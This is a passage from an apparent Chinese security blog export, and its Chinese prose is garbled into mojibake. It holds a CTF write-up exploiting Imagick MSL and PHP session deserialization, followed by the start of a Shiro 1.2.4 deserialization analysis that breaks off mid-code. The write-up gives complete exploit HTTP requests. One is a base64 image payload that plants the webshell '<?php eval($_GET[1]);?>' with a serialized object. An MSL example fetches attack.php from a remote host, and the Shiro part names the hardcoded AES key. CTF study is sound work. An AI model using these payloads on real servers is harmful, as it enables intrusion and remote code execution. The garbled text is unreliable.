Languageï¼‰å¯ä»¥å°†attack.phpä¸­çš„å†…å®¹è¯»å–ï¼ˆå³æ”¯æŒè¿œç¨‹ä¹Ÿæ”¯æŒæœ¬åœ°ï¼‰ï¼Œå¹¶å†™å…¥åˆ°victime.txtä¸­ï¼ˆwriteæ—¶æ–‡ä»¶ä¸å­˜åœ¨ä¼šè‡ªåŠ¨åˆ›å»ºï¼‰ï¼š\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<image>\n <read filename=\"http://xxxx.xxxx:8080/attack.php\" />\n <write filename=\"/tmp/victim.txt\" />\n</image>\n```\n\nç„¶åè¿™é“é¢˜ç”¨open_basediré™åˆ¶äº†è®¿é—®è·¯å¾„å¿…é¡»æ˜¯/tmpï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç”¨ä¸Šé¢è¿™ä¸ªåŠæ³•æ¥æŠŠ/flagç§»åŠ¨åˆ°/tmpä¸‹è¿›è¡Œè¯»å–ã€‚\n\nåˆ©ç”¨ç‚¹åœ¨_sleepä¸­ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è¦äººä¸ºçš„è§¦å‘fumo_backdoorçš„å¯¹è±¡çš„`__sleep`å‡½æ•°ï¼Œå¹¶ä¸”è¿™ä¸ªå¯¹è±¡çš„pathå±æ€§æ˜¯æˆ‘ä»¬åœ¨ç§»åŠ¨åçš„flagçš„è·¯å¾„ï¼ˆ/tmp/xxxxï¼‰ï¼Œ`__sleep`å‡½æ•°æ˜¯åœ¨å¯¹è±¡åºåˆ—åŒ–æ—¶è§¦å‘çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬åº”è¯¥å¦‚ä½•äººä¸ºçš„å®ä¾‹åŒ–ä¸€ä¸ªfumo_backdoorå¯¹è±¡ï¼Ÿ\n\n```php\n    public function __sleep() {\n        if (\n            file_exists($this->path) && \n            preg_match_all('/[flag]/m', $this->path) === 0\n        ) {\n            readfile($this->path);\n        }\n    }\n```\n\nè¿™é‡Œåˆ©ç”¨çš„å°±æ˜¯phpçš„sessionäº†ï¼Œphpçš„sessioné»˜è®¤å­˜æ”¾ä½ç½®åœ¨/tmpä¸‹ï¼Œé»˜è®¤åå­—ä¸ºsess_xxxxxxï¼Œå¹¶ä¸”sessioné‡Œé¢çš„å†…å®¹æ˜¯ä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜åœ¨çš„ï¼Œå½“å®¢æˆ·ç«¯å‘æ¥æºå¸¦ç€PHPSESSIDçš„è¯·æ±‚æ—¶ï¼Œå¯¹åº”sessionIDçš„sessionå°±ä¼šååºåˆ—åŒ–åè£…è½½åˆ°$__SESSIONæ•°ç»„ä¸­ï¼Œå½“phpç¨‹åºè¿è¡Œç»“æŸååˆä¼šå°†Sessionåºåˆ—åŒ–å›å»å‚¨å­˜èµ·æ¥ï¼Œæ‰€ä»¥æ•´åˆ°é¢˜å¤§ä½“æ€è·¯å¦‚ä¸‹ï¼š\n\n- é€šè¿‡MSLå°†/flagå†™å…¥åˆ°/tmp/ä¸‹çš„ä»»æ„ä¸€æ–‡ä»¶ä¸­\n- é€šè¿‡MSLå°†ä¸€æ®µåºåˆ—åŒ–æ•°æ®å†™å…¥åˆ°/tmp/sess_xxxxxä¸­ï¼Œè¿™æ®µåºåˆ—åŒ–çš„æ•°æ®ä¸­æ˜¯ä¸€ä¸ªfumo_backdoorå¯¹è±¡ï¼Œå¹¶ä¸”pathä¸º/tmp/flagåå­—\n- è®¿é—®æ—¶æºå¸¦`Cookie: PHPSESSID=xxxxx`æ¥è°ƒç”¨è¿™ä¸ªsessionè¿›è¡Œåºåˆ—åŒ–ï¼Œä»è€Œæ‰§è¡Œé‡Œé¢fumo_backdoorå¯¹è±¡çš„`__sleep`æ–¹æ³•ï¼Œè¯»å–flag\n\n### å¤ç°æµç¨‹\n\nç¯å¢ƒç»™äº†å¯ä»¥æ‰§è¡Œæ— å‚å‡½æ•°çš„ç‚¹ï¼Œçœ‹ä¸€ä¸‹phpinfoï¼Œå‘ç°å¼€å¯äº†imagicæ‹“å±•ï¼š\n![image-20230627164353391](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230627164353391.png)\n\nè¿˜æ˜¯ç”¨pypypé‚£é“é¢˜çš„ä¸Šä¼ è¡¨å•æŠ“ä¸ªåŒ…ï¼Œç„¶åæ„é€ å‡ºå¦‚ä¸‹æ•°æ®åŒ…å‘é€ä¸Šä¼ æ•°æ®ï¼Œåœ¨phpä¸­ä¸Šä¼ çš„æ•°æ®ä¼šä»¥phpXXXXXXï¼ˆXæ˜¯A-Zã€a-zã€1-9ä¸­çš„å­—ç¬¦æ‹¼èµ·æ¥çš„éšæœºå­—ç¬¦ä¸²ï¼‰å­˜åˆ°/tmpä¸‹ï¼Œæ‰€ä»¥è¿™æ—¶æˆ‘ä»¬ä¼ å…¥çš„è¿™ä¸€æ®µmslå°±ä¼šä»¥phpXXXXXXçš„æ–‡ä»¶åå‚¨å­˜èµ·æ¥ï¼Œæˆ‘ä»¬è¦æ‰§è¡Œè¿™å…¶ä¸­çš„ä»£ç å°±å¯ä»¥ç”¨new Imagic('vid:msl:/tmp/php*')è¿™ç§æ–¹æ³•ï¼Œ`msl://`ç”¨æ¥æ‰§è¡Œä¸€æ®µmslä»£ç ï¼Œ`vid://`ä¸­å¯ä»¥ä½¿ç”¨é€šé…ç¬¦æ¥è¡¨ç¤ºè·¯å¾„ï¼Œè¿™æ ·æ ¹ç›®å½•ä¸‹çš„flagå°±è¢«æˆ‘ä»¬ç§»åŠ¨åˆ°/tmpä¸‹äº†ï¼Œåå­—ä¸ºsessï¼š\n\n```tex\nPOST /?data=O%3A13%3A%22fumo_backdoor%22%3A4%3A%7Bs%3A4%3A%22path%22%3BN%3Bs%3A4%3A%22argv%22%3Bs%3A17%3A%22vid%3Amsl%3A%2Ftmp%2Fphp%2A%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22aadsad%22%3Bs%3A5%3A%22class%22%3Bs%3A7%3A%22Imagick%22%3B%7D&cmd=unserialze HTTP/1.1\nHost: 127.0.0.1:18080\nCache-Control: max-age=0\nsec-ch-ua: \"-Not.A/Brand\";v=\"8\", \"Chromium\";v=\"102\"\nsec-ch-ua-mobile: ?0\nsec-ch-ua-platform: \"macOS\"\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: none\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryBnq6Y9OQrGIyzsLe\nContent-Length: 362\n\n------WebKitFormBoundaryBnq6Y9OQrGIyzsLe\n\n------WebKitFormBoundaryBnq6Y9OQrGIyzsLe\nContent-Disposition: form-data; name=\"test\"; filename=\"test.msl\"\nContent-Type: application/octet-stream\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<image>\n <read filename=\"mvg:/flag\" />\n <write filename=\"/tmp/sess\" />\n</image>\n------WebKitFormBoundaryBnq6Y9OQrGIyzsLe--\n\n```\n\n![image-20230627205717400](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230627205717400.png)\n\næˆ‘ä»¬æ„é€ å¦ä¸€ä¸ªæ•°æ®åŒ…ï¼Œä¸Šä¼ çš„æ–‡ä»¶æ˜¯ä¸€å¼ ppmæ ¼å¼çš„å›¾ç‰‡ï¼Œæˆ‘ä»¬éœ€è¦åœ¨é‡Œé¢æ·»åŠ åºåˆ—åŒ–åçš„æ•°æ®ï¼Œè‡³äºä¸ºä»€ä¹ˆè¦é€‰ç”¨ppmæ ¼å¼åŸå› å¦‚ä¸‹ï¼š\n\n> å†™å…¥æ–‡ä»¶æ—¶é¡»æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š\n>\n> 1. å› ä¸º`imagick`å¯¹æ–‡ä»¶æ ¼å¼è§£æè¾ƒä¸¥ï¼Œéœ€è¦å†™å…¥çš„æ–‡ä»¶å¿…é¡»æ˜¯å…¶æ”¯æŒçš„å›¾ç‰‡æ ¼å¼ï¼Œå¦‚jpgã€gifã€icoç­‰ã€‚å¦‚æœç›´æ¥æ’å…¥`session`æ•°æ®ï¼Œä¼šå¯¼è‡´è§£æå›¾ç‰‡é”™è¯¯ï¼Œå¯¼è‡´æ–‡ä»¶æ— æ³•å†™å…¥ã€‚\n> 2. `php`å¯¹`session`çš„æ ¼å¼è§£æä¹Ÿè¾ƒä¸ºä¸¥æ ¼ã€‚æ•°æ®å°¾ä¸å¯ä»¥å­˜åœ¨è„æ•°æ®ï¼Œå¦åˆ™`session`è§£æé”™è¯¯ä¼šæ— æ³•è§¦å‘`__sleep`ã€‚\n>\n> æ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªå®¹è®¸åœ¨æœ«å°¾æ·»åŠ è„æ•°æ®ï¼Œä¸”è„æ•°æ®ä¸ä¼šè¢«`imagick`æŠ¹å»çš„å›¾ç‰‡æ ¼å¼ã€‚`imagick`å…±æ”¯æŒå‡ åç§å›¾ç‰‡æ ¼å¼ï¼Œ\n>\n> é¢˜ç›®æç¤ºå¯ä»¥ä½¿ç”¨`ppm`æ ¼å¼ï¼Œå…¶ä¸åƒå…¶ä»–å›¾ç‰‡æ ¼å¼å­˜åœ¨`crc`æ ¡éªŒæˆ–è€…åœ¨æ–‡ä»¶æœ«å°¾å­˜åœ¨`magic`å¤´ã€‚ç»“æ„ååˆ†ç®€å•ï¼Œå¯ä»¥è¿›è¡Œåˆ©ç”¨ã€‚\n\nå‘åŒ…ï¼š\n\n```tex\nPOST /?data=O%3A13%3A%22fumo_backdoor%22%3A4%3A%7Bs%3A4%3A%22path%22%3BN%3Bs%3A4%3A%22argv%22%3Bs%3A17%3A%22vid%3Amsl%3A%2Ftmp%2Fphp%2A%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22aadsad%22%3Bs%3A5%3A%22class%22%3Bs%3A7%3A%22Imagick%22%3B%7D&cmd=unserialze HTTP/1.1\nHost: 127.0.0.1:18080\nCache-Control: max-age=0\nsec-ch-ua: \"-Not.A/Brand\";v=\"8\", \"Chromium\";v=\"102\"\nsec-ch-ua-mobile: ?0\nsec-ch-ua-platform: \"macOS\"\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: none\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryBnq6Y9OQrGIyzsLe\nContent-Length: 743\n\n------WebKitFormBoundaryBnq6Y9OQrGIyzsLe\n\n------WebKitFormBoundaryBnq6Y9OQrGIyzsLe\nContent-Disposition: form-data; name=\"test\"; filename=\"test.msl\"\nContent-Type: application/octet-stream\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<image>\n <read filename=\"inline:data://image/x-portable-anymap;base64,UDYKOSA5CjI1NQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADw/cGhwIGV2YWwoJF9HRVRbMV0pOz8+fE86MTM6ImZ1bW9fYmFja2Rvb3IiOjI6e3M6NDoicGF0aCI7czo5OiIvdG1wL3Nlc3MiO3M6MTI6ImRvX2V4ZWNfZnVuYyI7YjowO30=\" />\n <write filename=\"/tmp/sess_y1\" />\n</image>\n------WebKitFormBoundaryBnq6Y9OQrGIyzsLe--\n\n```\n\nä¼ å®Œè¿™ä¸ªåŒ…åsess_y1å°±ç”Ÿæˆå¥½äº†ï¼š\n\n![image-20230627205811171](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230627205811171.png)\n\nå†ç”¨session_startå‡½æ•°ç„¶åå¸¦ç€PHPSESSIDè®¿é—®å³å¯ï¼š\n\n```tex\nGET /?data=O:13:\"fumo_backdoor\":4:{s:4:\"path\";N;s:4:\"argv\";N;s:4:\"func\";s:13:\"session_start\";s:5:\"class\";N;}&cmd=unserialze HTTP/1.1\nHost: 127.0.0.1:18080\nCache-Control: max-age=0\nsec-ch-ua: \"-Not.A/Brand\";v=\"8\", \"Chromium\";v=\"102\"\nsec-ch-ua-mobile: ?0\nsec-ch-ua-platform: \"macOS\"\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36\nCookie: PHPSESSID=y1\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: none\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\n\n```\n\n![image-20230627205901948](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230627205901948.png)\n","tags":["SCTF"],"categories":["CTF"]},{"title":"Shiro550","url":"/2023/06/08/Shiro550/","content":"# Shiro550ååºåˆ—åŒ–\n\n## ç¯å¢ƒé…ç½®\n\n- ä»£ç å‡†å¤‡ï¼Œéœ€è¦1.2.4ç‰ˆæœ¬çš„shiroä»£ç æ¥è¿è¡Œï¼š\n\n  ```bash\n  git clone https://github.com/apache/shiro.git\n  cd shiro\n  git checkout shiro-root-1.2.4\n  ```\n\n- ä¿®æ”¹mavenä¾èµ–ï¼šåœ¨é¡¹ç›®æ ¹ç›®å½•çš„pom.xmlä¸‹ä¿®æ”¹jstlä¾èµ–é¡¹ä¸º\n\n```xml\n    <dependency>\n                <groupId>javax.servlet</groupId>\n                <artifactId>servlet-api</artifactId>\n                <version>2.5</version>\n                <scope>provided</scope>\n            </dependency>\n```\n\n- jdkåŠtomcatç‰ˆæœ¬é€‰ç”¨ï¼š\n\n  jdké€‰ç”¨1.7ï¼š[Java Archive Downloads - Java SE 7 (oracle.com)](https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html)\n\n  tomcaté€‰ç”¨8.xï¼š[Apache TomcatÂ® - Apache Tomcat 8 Software Downloads](https://tomcat.apache.org/download-80.cgi)\n\n- ideaä¸­é…ç½®tomcatå¹¶è¿è¡Œshiroé¡¹ç›®ï¼š\n\n  ç­‰å¾…mavenä¾èµ–å¯¼å…¥å®Œæˆåå°±å¯ä»¥é…ç½®tomcatäº†ï¼Œä¸€éƒ¨åˆ†mavenä¾èµ–å¯èƒ½æ— æ³•å¯¼å…¥ï¼Œä½†ä¸å½±å“é¡¹ç›®æ­£å¸¸å¯åŠ¨ã€‚\n\n  tomcatçš„é…ç½®ï¼Œæ­¤å¤–ä¹Ÿè¦å¯¹é¡¹ç›®å·¥ç¨‹åŠsdkå’Œjavaç¼–è¯‘ç‰ˆæœ¬é€‰æ‹©ä¸º1.7ï¼Œè¿™é‡Œè¦å°†HTTP portæ”¹ä¸ºå…¶ä»–ç«¯å£ï¼Œå› ä¸ºä¸€ä¼šæˆ‘ä»¬éœ€è¦ç”¨burpsuiteæŠ“åŒ…ï¼Œburpsuiteé»˜è®¤ç«¯å£ä¹Ÿæ˜¯8080ï¼Œä¼šé€ æˆç«¯å£å†²çªï¼š![image-20230607143914577](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230607143914577.png)\n\n  ![image-20230607143930952](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230607143930952.png)\n\n- æˆåŠŸå¯åŠ¨åå¦‚ä¸‹ï¼š\n\n  ![image-20230607144051580](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230607144051580.png)\n\n![image-20230607144108059](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230607144108059.png)\n\n## URLDNSæ¢æµ‹Shiro550\n\n\n\næˆ‘ä»¬åœ¨æ­å»ºå¥½çš„ç½‘ç«™ä¸Šè¿›è¡Œç™»é™†ï¼Œå¹¶ä¸”è¦å‹¾é€‰RemembermeåæŠ“åŒ…ï¼Œå¯ä»¥å‘ç°åœ¨Serverç«¯è¿”å›çš„Cookieä¸­æœ‰ä¸€ä¸ªrememberMeå­—æ®µï¼Œå¹¶ä¸”å…¶ä¸­çœ‹èµ·æ¥åƒæ˜¯åŠ å¯†å‚¨å­˜äº†ä¸€äº›å†…å®¹ï¼š\t![image-20230607164039278](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230607164039278.png)\n\næˆ‘ä»¬å¯ä»¥åœ¨shiroçš„æºç ä¸­å‘ç°å®ç°è¿™ä¸ªåŠŸèƒ½çš„ç±»`CookieRememberMeManager`ï¼Œæ‰¾åˆ°å…¶ä¸­çš„`getRememberedSerializedIdentity`è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥çœ‹çš„å‡ºæ¥è¿™ä¸ªæ–¹æ³•ä¼šä»è¯·æ±‚ä¸­è·å–è¿™ä¸ªCookieå¹¶è¿”å›ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥çš„é€»è¾‘å°±æ˜¯æ‰¾å“ªä¸ªæ–¹æ³•è°ƒç”¨äº†è¿™ä¸ªæ–¹æ³•ï¼Œç„¶åå¯¹Cookieè¿›è¡Œè§£å¯†ç­‰å¤„ç†ï¼š\n\n```Java\n  protected byte[] getRememberedSerializedIdentity(SubjectContext subjectContext) {\n\n        if (!WebUtils.isHttp(subjectContext)) {\n            if (log.isDebugEnabled()) {\n                String msg = \"SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a \" +\n                        \"servlet request and response in order to retrieve the rememberMe cookie. Returning \" +\n                        \"immediately and ignoring rememberMe operation.\";\n                log.debug(msg);\n            }\n            return null;\n        }\n\n        WebSubjectContext wsc = (WebSubjectContext) subjectContext;\n        if (isIdentityRemoved(wsc)) {\n            return null;\n        }\n\n        HttpServletRequest request = WebUtils.getHttpRequest(wsc);\n        HttpServletResponse response = WebUtils.getHttpResponse(wsc);\n\n        String base64 = getCookie().readValue(request, response);\n        // Browsers do not always remove cookies immediately (SHIRO-183)\n        // ignore cookies that are scheduled for removal\n        if (Cookie.DELETED_COOKIE_VALUE.equals(base64)) return null;\n\n        if (base64 != null) {\n            base64 = ensurePadding(base64);\n            if (log.isTraceEnabled()) {\n                log.trace(\"Acquired Base64 encoded identity [\" + base64 + \"]\");\n            }\n            byte[] decoded = Base64.decode(base64);\n            if (log.isTraceEnabled()) {\n                log.trace(\"Base64 decoded byte array length: \" + (decoded != null ? decoded.length : 0) + \" bytes.\");\n            }\n            return decoded;\n        } else {\n            //no cookie set - new site visitor?\n            return null;\n        }\n    }\n```\n\nåœ¨`org/apache/shiro/mgt/AbstractRememberMeManager`è¿™ä¸ªç±»ä¸­æˆ‘ä»¬æ‰¾åˆ°äº†`getRememberedPrincipals`è¿™ä¸ªæ–¹æ³•è°ƒç”¨äº†`getRememberedSerializedIdentity`ï¼Œç„¶åæŠŠè¿™ä¸ªCookieç”¨`convertBytesToPrincipals`è¿›è¡Œå¤„ç†ï¼Œæˆ‘ä»¬è·Ÿè¿›è¿™ä¸ªæ–¹æ³•ï¼š\n\n```Java\n    public PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) {\n        PrincipalCollection principals = null;\n        try {\n            byte[] bytes = getRememberedSerializedIdentity(subjectContext);\n            //SHIRO-138 - only call convertBytesToPrincipals if bytes exist:\n            if (bytes != null && bytes.length > 0) {\n                principals = convertBytesToPrincipals(bytes, subjectContext);\n            }\n        } catch (RuntimeException re) {\n            principals = onRememberedPrincipalFailure(re, subjectContext);\n        }\n\n        return principals;\n    }\n```\n\nå¯ä»¥çœ‹åˆ°è¿™ä¸ªæ–¹æ³•åšäº†ä¸¤ä»¶äº‹ï¼Œä¸€ä¸ªæ˜¯å¯¹è¿™ä¸ªä¼ è¿‡æ¥çš„Cookieè¿›è¡Œdecryptï¼ˆè§£å¯†ï¼‰ï¼Œä¸€ä¸ªæ˜¯å¯¹è¿™ä¸ªCookieè¿›è¡Œdeserializeï¼ˆååºåˆ—åŒ–ï¼‰ï¼Œæˆ‘ä»¬åˆ†åˆ«è·Ÿè¿›è¿™ä¸¤ä¸ªæ–¹æ³•çœ‹ä¸€ä¸‹ï¼š\n\n```java\n    protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) {\n        if (getCipherService() != null) {\n            bytes = decrypt(bytes);\n        }\n        return deserialize(bytes);\n    }\n```\n\nå…ˆæ¥çœ‹`deserialize`ï¼š\n\n```java\n    protected PrincipalCollection deserialize(byte[] serializedIdentity) {\n        return getSerializer().deserialize(serializedIdentity);\n    }\n```\n\nè¿™ä¸ªå‡½æ•°æŠŠCookieä¼ ç»™äº†`getSerializer().deserialize()`è¿™ä¸ªæ–¹æ³•ï¼Œ`getSerializer`çš„è¿”å›å€¼æ˜¯`serializer`ï¼Œè¿™ä¸ªå˜é‡åœ¨æ„é€ å‡½æ•°å†…è¿›è¡Œäº†åˆå§‹åŒ–ï¼Œæ˜¯ä¸€ä¸ª`DefaultSerializer`ï¼Œå› æ­¤æˆ‘ä»¬è·Ÿè¿›`DefaultSerializer.deserialize`\n\n```java\n    public Serializer<PrincipalCollection> getSerializer() {\n        return serializer;\n    }\n\n## æ„é€ å‡½æ•°\npublic AbstractRememberMeManager() {\n        this.serializer = new DefaultSerializer<PrincipalCollection>();\n        this.cipherService = new AesCipherService();\n        setCipherKey(DEFAULT_CIPHER_KEY_BYTES);\n    }\n```\n\nå¯ä»¥å‘ç°å°±æ˜¯å®ç°äº†ä¸€ä¸ªååºåˆ—åŒ–ï¼Œå› æ­¤ç¡®å®å­˜åœ¨ååºåˆ—åŒ–æ¼æ´çš„ç‚¹ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥å°±è¦ç ´è§£ä¸Šé¢çš„åŠ å¯†ç®—æ³•ï¼Œä»è€Œèƒ½è®©æˆ‘ä»¬è‡ªå·±çš„payloadåŠ å¯†åå‘è¿‡å»ï¼š\n\n```java\n    public T deserialize(byte[] serialized) throws SerializationException {\n        if (serialized == null) {\n            String msg = \"argument cannot be null.\";\n            throw new IllegalArgumentException(msg);\n        }\n        ByteArrayInputStream bais = new ByteArrayInputStream(serialized);\n        BufferedInputStream bis = new BufferedInputStream(bais);\n        try {\n            ObjectInputStream ois = new ClassResolvingObjectInputStream(bis);\n            @SuppressWarnings({\"unchecked\"})\n            T deserialized = (T) ois.readObject();\n            ois.close();\n            return deserialized;\n        } catch (Exception e) {\n            String msg = \"Unable to deserialze argument byte array.\";\n            throw new SerializationException(msg, e);\n        }\n    }\n```\n\nå›åˆ°decryptä¸Šï¼Œdecryptæ–¹æ³•å…ˆé€šè¿‡`getDecryptionCipherKey`æ–¹æ³•è·å–äº†ä¸€ä¸ªå¯†é’¥ï¼Œç„¶åå°†Cookieäº¤ç»™`cipherService.decrypt`æ–¹æ³•è§£å¯†ï¼š\n\n```java\n   protected byte[] decrypt(byte[] encrypted) {\n        byte[] serialized = encrypted;\n        CipherService cipherService = getCipherService();\n        if (cipherService != null) {\n            ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey());\n            serialized = byteSource.getBytes();\n        }\n        return serialized;\n    }\n```\n\nå¯ä»¥çœ‹åˆ°`cipherService`æ˜¯é€šè¿‡`getCipherService`æ–¹æ³•å¾—åˆ°çš„ï¼Œè·Ÿè¿›å‘ç°è¿”å›å€¼åœ¨æ„é€ å‡½æ•°ä¸­åˆå§‹åŒ–ï¼Œå…¶å®åˆ°è¿™é‡Œå¯ä»¥çœ‹çš„å‡ºæ¥å°±æ˜¯ä¸ªAesåŠ å¯†äº†ï¼ˆå¹¶ä¸”ä¸‹é¢çš„setCipherKeyå…¶å®å°±æ˜¯AESçš„å¯†é’¥ï¼Œä¸è¿‡æˆ‘ä»¬å‡è£…ä¸çŸ¥é“ä¸€ä¼šå†æ‰¾å›æ¥ï¼‰ï¼Œç»§ç»­è·Ÿè¿›`AesCipherService`çš„è¯å¯ä»¥çœ‹åˆ°AesåŠ å¯†çš„å…·ä½“æ–¹å¼ï¼Œè¿™é‡Œå°±ä¸å±•ç¤ºå‡ºæ¥äº†ï¼š\n\n```java\n    public AbstractRememberMeManager() {\n        this.serializer = new DefaultSerializer<PrincipalCollection>();\n        this.cipherService = new AesCipherService();\n        setCipherKey(DEFAULT_CIPHER_KEY_BYTES);\n    }\n```\n\næˆ‘ä»¬å†å›å¤´çœ‹`getDecryptionCipherKey`æ–¹æ³•è·å–å¯†é’¥çš„é€»è¾‘ï¼Œè·Ÿè¿›ï¼š\n\n```java\n    public byte[] getDecryptionCipherKey() {\n        return decryptionCipherKey;\n    }\n```\n\nå†æ‰¾`decryptionCipherKey`è¿™ä¸ªå±æ€§åœ¨å“ªé‡Œè¿›è¡Œçš„èµ‹å€¼ï¼Œå¯ä»¥å‘ç°æ˜¯é€šè¿‡setterèµ‹å€¼ï¼ˆFind Usage -> Value Writeï¼‰ï¼š\n\n```java\n   public void setDecryptionCipherKey(byte[] decryptionCipherKey) {\n        this.decryptionCipherKey = decryptionCipherKey;\n    }\n```\n\næ¥ç€çœ‹å“ªé‡Œè°ƒç”¨äº†`setDecryptionCipherKey`æ–¹æ³•ï¼Œå‘ç°åœ¨`setCipherKey`æ–¹æ³•ä¸­ï¼š\n\n```java\n    public void setCipherKey(byte[] cipherKey) {\n        //Since this method should only be used in symmetric ciphers\n        //(where the enc and dec keys are the same), set it on both:\n        setEncryptionCipherKey(cipherKey);\n        setDecryptionCipherKey(cipherKey);\n    }\n```\n\næœ€ç»ˆå…¶å®è¿˜æ˜¯åœ¨æ„é€ å‡½æ•°ä¼ äº†å¯†é’¥ï¼Œå¹¶ä¸”å¯ä»¥å‘ç°å¯†é’¥æ˜¯ä¸€ä¸ªå†™æ­»çš„å¸¸é‡ï¼Œå› æ­¤é—®é¢˜å°±å‡ºåœ¨è¿™é‡Œï¼Œåœ¨shiro1.2.4ç‰ˆæœ¬ä¸‹ï¼Œå¯†é’¥æ˜¯å†™æ­»çš„ï¼Œå¹¶ä¸”é‡‡ç”¨çš„æ˜¯AESåŠ å¯†ï¼ˆå¯¹ç§°åŠ å¯†ï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªå¯†é’¥è‡ªå·±æ„é€ payloadå¹¶åŠ å¯†åä¼ è¿‡å»è¿›è¡Œååºåˆ—åŒ–æ”»å‡»ï¼š\n\n```java\npublic AbstractRememberMeManager() {\n        this.serializer = new DefaultSerializer<PrincipalCollection>();\n        this.cipherService = new AesCipherService();\n        setCipherKey(DEFAULT_CIPHER_KEY_BYTES);\n    }\n\n private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(\"kPH+bIxk5D2deZiIxcaaaA==\");\n```\n\n------\n\næˆ‘ä»¬çœ‹ä¸€ä¸‹åœ¨è¿™ä¸ªåŒ…ä¸­çš„Mavenä¾èµ–æœ‰å“ªä¸ªæ˜¯æˆ‘ä»¬å¯æ”»å‡»çš„ï¼Œå‘ç°å­˜åœ¨commons-collections3.xï¼Œä¸è¿‡å¯ä»¥å‘ç°è¿™ä¸ªä¾èµ–é¡¹çš„scopeæ˜¯testï¼Œä¹Ÿå°±æ˜¯è¯´åªæœ‰åœ¨testä¸­è¿è¡Œæ—¶è¿™ä¸ªä¾èµ–æ‰ä¼šè¢«å¯¼å…¥ï¼Œé‚£ä¹ˆçœŸå®æ¡ä»¶ä¸‹æ˜¯ä¸å­˜åœ¨è¿™ä¸ªä¾èµ–çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æ˜¯æ²¡æœ‰åŠæ³•é€šè¿‡è¿™ä¸ªä¾èµ–è¿›è¡Œæ”»å‡»çš„ï¼š\n\n![image-20230607172709399](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230607172709399.png)\n\nå®é™…ä¸Šå¯ä»¥æ”»å‡»çš„ä¾èµ–æ˜¯commons-beanutilsè¿™ä¸ªä¾èµ–ï¼Œä¸è¿‡æˆ‘ä»¬è¿™é‡Œå…ˆç”¨Javaè‡ªå¸¦çš„URLDNSè¿›è¡Œä¸€ä¸‹æµ‹è¯•\n\n![image-20230607172853432](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230607172853432.png)\n\n------\n\nå°†URLDNSçš„åˆ©ç”¨ç±»åºåˆ—åŒ–å‡ºæ¥ï¼Œæˆ‘è¿™é‡Œåºåˆ—åŒ–åä¿å­˜çš„æ–‡ä»¶åå«åšser.binï¼š\n\n```java\npackage 